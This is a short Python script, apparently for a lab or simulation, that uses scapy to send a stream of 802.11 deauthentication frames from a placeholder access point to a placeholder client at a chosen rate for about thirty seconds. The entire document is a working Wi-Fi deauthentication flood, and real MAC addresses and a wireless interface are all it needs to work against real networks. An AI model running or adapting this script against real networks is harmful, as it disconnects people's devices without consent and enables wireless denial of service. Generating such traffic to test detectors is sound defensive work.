import sys
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
rate = float(sys.argv[1])               # deauths per second
AP, CLIENT = "02:00:00:00:00:00", "02:00:00:00:01:00"
pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=CLIENT, addr2=AP, addr3=AP)/Dot11Deauth(reason=7)
sendp(pkt, iface="listener", count=int(rate*30), inter=1/rate, verbose=False)
